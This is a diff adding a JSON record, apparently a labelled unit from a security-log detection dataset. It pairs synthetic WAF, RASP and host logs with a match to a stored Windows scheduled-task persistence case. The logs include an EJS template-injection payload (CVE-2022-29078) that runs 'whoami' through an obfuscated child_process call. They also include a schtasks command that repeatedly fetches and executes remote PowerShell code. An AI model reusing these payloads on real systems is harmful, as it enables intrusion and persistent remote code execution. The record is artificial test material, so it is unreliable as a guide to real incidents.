@@ -1,0 +1,170 @@
+{
+ "unit": 1076,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Node.js EJS 模板注入（outputFunctionName → mainModule 加载 child_process）CVE-2022-29078",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-03 00:11:13",
+   "source": "waf",
+   "log_id": "WAF0213932",
+   "content": "/api/render outputFunctionName=x;process.mainModule['requ'+'ire']('child_pro'+'cess').execSync('whoami') Mozil",
+   "event_id": "1076-WAF0213932"
+  },
+  {
+   "timestamp": "2026-06-03 00:11:15",
+   "source": "web",
+   "log_id": "WEB0215325",
+   "content": "/api/render outputFunctionName=x;process.mainModule['requ'+'ire']('child_pro'+'cess').execSync('whoami') Mozil",
+   "event_id": "1076-WEB0215325"
+  },
+  {
+   "timestamp": "2026-06-03 00:11:17",
+   "source": "rasp",
+   "log_id": "RASP0236680",
+   "content": "https://app-node-126.ops-corp.com/api/render {\"ejs\": \"outputFunctionName\", \"exec\": \"obfuscated-require\"} Mozil",
+   "event_id": "1076-RASP0236680"
+  },
+  {
+   "timestamp": "2026-06-03 00:13:15",
+   "source": "hids",
+   "log_id": "HID0231851",
+   "content": "whoami C:\\Windows\\System32\\whoami.exe whoami <== cmd.exe /c whoami <== node.exe C:\\app\\server.js",
+   "event_id": "1076-HID0231851"
+  },
+  {
+   "timestamp": "2026-06-03 00:14:22",
+   "source": "hids",
+   "log_id": "HID0231856",
+   "content": "schtasks /create /tn Updater /tr \"powershell -c IEX(iwr 10.20.5.19/a)\" /sc minute /mo 5 schtasks schtasks <== ",
+   "event_id": "1076-HID0231856"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-003",
+   "name": "Windows 计划任务持久化（schtasks 周期拉起载荷）",
+   "summary": "调度接口被注入 schtasks 命令 → 应用侧记录 cmd_inject=schtasks → 主机侧创建周期计划任务执行 C:\\Windows\\Temp 下的载荷。",
+   "matched_steps": 1,
+   "detected_steps": 1,
+   "total_steps": 3,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S3",
+     "action_id": "schtasks_interval_task",
+     "label": "创建周期计划任务执行载荷",
+     "generic": false,
+     "event_ids": [
+      "1076-HID0231856"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "aligned_event_id": "1076-HID0231856",
+     "detections": [
+      {
+       "event_id": "1076-HID0231856",
+       "source": "hids",
+       "timestamp": "2026-06-03 00:14:22"
+      }
+     ]
+    }
+   ],
+   "source_mismatches": [],
+   "unaligned_detections": [],
+   "keyword_score": 7,
+   "keyword_details": [
+    "keyword +3: schtasks /create",
+    "probe +4: schtasks\\s+/create"
+   ],
+   "mitre": [
+    "T1053.005",
+    "T1059.003"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2"
+   ],
+   "before_steps": [
+    "S1",
+    "S2"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 1,
+   "pattern_scope": {
+    "attack_family": "Windows 计划任务持久化",
+    "variant_note": "由单个合成样本归纳；任务名/触发间隔/载荷路径均来自该样本，未验证其它调度器变体。"
+   },
+   "negative_and_unknown_evidence": {
+    "not_observed": [
+     "横向移动",
+     "凭据窃取",
+     "载荷内容"
+    ],
+    "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+   },
+   "provenance": {
+    "observation_count": 1,
+    "evidence_status": "single_observation_demo",
+    "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+   }
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S3",
+    "label": "创建周期计划任务执行载荷",
+    "sources": [
+     "hids"
+    ],
+    "generic": false,
+    "event_ids": [
+     "1076-HID0231856"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S2"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1",
+   "S2"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 7,
+  "mitre": [
+   "T1053.005",
+   "T1059.003"
+  ]
+ }
+}
